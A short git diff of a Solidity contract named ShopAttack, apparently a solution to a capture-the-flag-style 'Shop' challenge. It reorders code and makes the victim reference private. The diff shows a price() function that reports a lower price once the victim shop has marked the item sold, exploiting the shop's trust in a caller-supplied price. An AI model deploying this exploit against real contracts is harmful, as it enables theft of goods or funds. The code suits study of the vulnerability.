@@ -5,14 +5,10 @@ pragma solidity ^0.8.0;
 import "./interfaces/IShop.sol";
 
 contract ShopAttack {
-    IShop public immutable victimShop;
+    IShop private immutable victimShop;
 
     constructor(IShop victimShop_) {
         victimShop = victimShop_;
-    }
-
-    function price() external view returns (uint256) {
-        return victimShop.price() - (victimShop.isSold() ? 1 : 0);
     }
 
     function attack() external {
@@ -24,5 +20,9 @@ contract ShopAttack {
             victimShop.isSold() && price_ > victimShop.price(),
             "Shop: Attack failed"
         );
+    }
+
+    function price() external view returns (uint256) {
+        return victimShop.price() - (victimShop.isSold() ? 1 : 0);
     }
 }
